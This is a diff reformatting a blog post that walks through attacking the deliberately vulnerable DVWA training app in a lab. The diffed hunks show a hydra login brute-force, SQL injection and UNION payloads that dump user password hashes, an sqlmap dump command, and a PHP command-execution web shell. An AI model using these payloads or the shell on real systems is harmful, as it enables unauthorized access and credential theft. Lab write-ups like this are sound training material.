@@ -1,16 +1,12 @@
----
-categories:
-- pentest
-- web
-tags:
-- dvwa
-- php
-- mysql
-comments: false
-date: 2015-02-02T08:40:17Z
-title: Exploring Damn Vulnerable Web Application
-url: /2015/02/02/damn-vulnerable-web-application/
----
++++
+categories = ["web", "php"]
+description = ""
+keywords = []
+date = "2015-02-02T08:40:17Z"
+title = "Exploring Damn Vulnerable Web Application"
+
++++
+
 ## Intro
 
 Damn Vulnerable Web App (DVWA) is a PHP/MySQL web application that is damn vulnerable. Its main goals are to be an aid for security professionals to test their skills and tools in a legal environment, help web developers better understand the processes of securing web applications and aid teachers/students to teach/learn web application security in a class room environment.
@@ -27,7 +23,7 @@ Our first task is to brute force HTTP based login form:
 
 ![Brute Force](/images/bf.png)
 
-Using `burp` we find that parameters are transmitted via URL:
+Using *burp* we find that parameters are transmitted via URL:
 
 `http://192.168.52.129/dvwa/vulnerabilities/brute/?username=test&password=test&Login=Login#`
 
@@ -37,7 +33,7 @@ And our session data:
 
 Using this information we can use `hydra` to brute force the login form:
 
-{{<codecaption lang="text" title="Hydra bruteforce">}}
+```
 root@kali:~# hydra 192.168.52.129 -L user.txt -P pass.txt http-get-form "/dvwa/vulnerabilities/brute/index.php:username=^USER^&password=^PASS^&Login=Login:Username and/or password incorrect.:H=Cookie: security=low; PHPSESSID=872eb7bf8ffde53b4d00d3c1a5df9a28"
 Hydra v7.6 (c)2013 by van Hauser/THC & David Maciejak - for legal purposes only
 
@@ -47,7 +43,7 @@ Hydra (http://www.thc.org/thc-hydra) starting at 2015-02-02 09:13:54
 [80][www-form] host: 192.168.52.129   login: admin   password: password
 1 of 1 target successfully completed, 1 valid password found
 Hydra (http://www.thc.org/thc-hydra) finished at 2015-02-02 09:13:57
-{{</codecaption>}}
+```
 
 We found valid login credentials: `admin:password` 
 
@@ -146,13 +142,13 @@ snmp:x:115:65534::/var/lib/snmp:/bin/false
 
 User input is unfiltered and used in the following query:
 
-`SELECT first_name, last_name FROM users WHERE user_id = '$id'`
+**`SELECT first_name, last_name FROM users WHERE user_id = '$id'`**
 
-If we enter `' or 1=1-- -` as an id then the query becomes:
+If we enter **' or 1=1-- -** as an id then the query becomes:
 
-`SELECT first_name, last_name FROM users WHERE user_id = '' or 1=1`
+**`SELECT first_name, last_name FROM users WHERE user_id = '' or 1=1`**
 
-which makes WHERE clause always true and shows us all the records:
+which makes the WHERE clause always true and shows us all the records:
 
 ```
 ID: 'or 1=1-- -
@@ -176,8 +172,9 @@ First name: Bob
 Surname: Smith
 ```
 
-Using `UNION` keyword we can extract any information available to the app's user from the database.
-` ' union select database(),null -- -`
+Using **UNION** keyword we can extract any information available to the app's user from the database.
+
+**`' union select database(),null -- -`**
 
 ```
 ID: ' union select database(),null -- -
@@ -185,7 +182,7 @@ First name: dvwa
 Surname: 
 ```
 
-`' union select table_name,null from information_schema.tables where table_schema='dvwa'-- -`
+**`' union select table_name,null from information_schema.tables where table_schema='dvwa'-- -`**
 
 ```
 ID:  ' union select table_name,null from information_schema.tables where table_schema='dvwa'-- -
@@ -198,7 +195,7 @@ Surname:
 
 ```
 
-` ' union select column_name,null from information_schema.columns where table_name='users'-- -`
+**` ' union select column_name,null from information_schema.columns where table_name='users'-- -`**
 
 ```
 ID: ' union select column_name,null from information_schema.columns where table_name='users'-- -
@@ -226,7 +223,7 @@ First name: avatar
 Surname: 
 ```
 
-` ' union select user, password from users-- -`
+**` ' union select user, password from users-- -`**
 
 ```
 ID: ' union select user, password from users-- -
@@ -257,7 +254,7 @@ Looks like the passwords are MD5 hashed. However, they are easily found to be `t
 The blind SQL injection case uses the same vulnerable SQL query. The only difference is that the errors (from MySQL) are not shown to the user.
 We can use `sqlmap` to automate SQL injection exploitation (especially in blind injection cases where injection uses MANY boolean or time based queries)
 
-{{<codecaption lang="text" title="SQLMap Table Dump">}}
+```
 sqlmap -u "http://192.168.52.129/dvwa/vulnerabilities/sqli_blind/?id=1&Submit=Submit#" --cookie="security=low; PHPSESSID=872eb7bf8ffde53b4d00d3c1a5df9a28" --dump
 
 Database: dvwa
@@ -272,7 +269,7 @@ Table: users
 | 4       | pablo   | http://192.168.52.129/dvwa/hackable/users/pablo.jpg   | 0d107d09f5bbe40cade3de5c71e9e9b7 | Picasso   | Pablo      |
 | 5       | smithy  | http://192.168.52.129/dvwa/hackable/users/smithy.jpg  | 5f4dcc3b5aa765d61d8327deb882cf99 | Smith     | Bob        |
 +---------+---------+-------------------------------------------------------+----------------------------------+-----------+------------+
-{{</codecaption>}}
+```
 
 ## 6. File Upload
 
@@ -280,7 +277,7 @@ Table: users
 
 On the low security setting there are no restrictions on file upload. We can upload a php file containing simple code:
 
-{{<codecaption lang="php" title="PHP Shell">}}
+```
 <?php
 if(isset($_REQUEST['cmd'])){
     $cmd = ($_REQUEST["cmd"]);
@@ -289,7 +286,7 @@ if(isset($_REQUEST['cmd'])){
     die;
 }
 ?>
-{{</codecaption>}}
+```
 
 `../../hackable/uploads/shell.php succesfully uploaded!`
 
@@ -319,4 +316,4 @@ Here the app is vulnerable to XSS again. However, this time the injected code is
 
 DVWA includes most common web server vulnerabilities and provides easy access to the vulnerable pieces of code. It is a great package for a beginner level pentest demo. 
 
-  [meta2]: http://sourceforge.net/projects/metasploitable/files/Metasploitable2/
+[meta2]: http://sourceforge.net/projects/metasploitable/files/Metasploitable2/
